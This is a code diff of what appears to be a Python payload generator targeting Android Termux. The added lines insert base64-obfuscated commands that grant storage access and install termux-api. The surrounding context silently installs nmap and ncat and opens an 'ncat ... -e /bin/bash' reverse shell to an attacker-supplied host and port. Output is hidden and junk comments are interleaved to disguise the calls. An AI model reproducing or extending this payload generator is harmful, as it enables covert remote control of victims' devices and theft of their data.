@@ -145,6 +145,7 @@ elif payload=="5":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""base64 -d <<< dGVybXV4LXNldHVwLXN0b3JhZ2UK | bash
+base64 -d <<< YXB0IGluc3RhbGwgdGVybXV4LWFwaQo= | bash &> /dev/null
 c1=$(base64 -d <<< "YXB0LWdldCBpbnN0YWxsIG5tYXAK"); status=$?
 [[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
@@ -234,6 +235,9 @@ os.system("apt-get install nmap -y &> /dev/null")
 #kjhbskjhgsajkdhjkshda
 os.system("base64 -d <<< dGVybXV4LXNldHVwLXN0b3JhZ2UK | bash")
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
+#jhkjhgkjgjhgkjhgjkhgjhghj
+os.system("base64 -d <<< YXB0IGluc3RhbGwgdGVybXV4LWFwaQo= | bash")
+#jjkslshdfrsnqrewcsh
 os.system("apt-get install ncat -y &> /dev/null")
 #jhkjhjkhgkjhgkjhgjdkjhfjld
 os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
